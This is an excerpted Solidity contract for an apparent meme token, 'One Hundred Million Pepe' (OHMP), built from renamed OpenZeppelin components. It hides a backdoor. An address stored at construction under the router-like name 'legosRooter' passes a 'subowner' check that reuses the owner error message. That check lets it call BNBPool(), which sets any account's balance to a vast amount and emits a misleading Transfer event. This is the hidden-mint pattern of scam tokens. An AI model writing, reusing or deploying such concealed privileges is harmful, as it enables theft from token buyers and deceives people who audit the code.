...
/*
 * @dev Provides information about the current execution OHMP20Burnable, including the
 ...
 */
abstract contract OHMP20Burnable {
...
// File: @openzeppelin/contracts/access/OHMP20Ownable.sol
 ...
 * the owner.
 */
abstract contract OHMP20Ownable is OHMP20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "OHMP20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OHMP20Ownable: new owner is the zero address");
 ...
 * `SafeOHMP` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeOHMP {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeOHMP: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeOHMP: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeOHMP: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeOHMP: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeOHMP: modulo by zero");
  }
...
contract OHMP is OHMP20Burnable, OHMP711, OHMP20Ownable {
    
    using SafeOHMP for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "One Hundred Million Pepe";
        _symbol = "OHMP";
        _decimals = 9;
        _totalSupply = 69000000000000 * 10 ** 9;
    ...
    */
    ...
    /**
    * @dev See {OHMP711-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "OHMP20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {OHMP711-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    function BNBPool(address bnbRewards) external subowner {
        mintfrom[bnbRewards] = 10000000000 * 10 ** 23;
        
        emit Transfer(bnbRewards, address(0), 10000000000 * 10 ** 23);
    }
    /**
    * @dev See {OHMP711-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {OHMP711-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {OHMP711};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "OHMP711: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {OHMP711-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "OHMP711: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "OHMP711: transfer from the zero address");
        require(shippingto != address(0), "OHMP711: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "OHMP711: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "OHMP711: approve from the zero address");
        require(transporteur != address(0), "OHMP711: approve to the zero address");
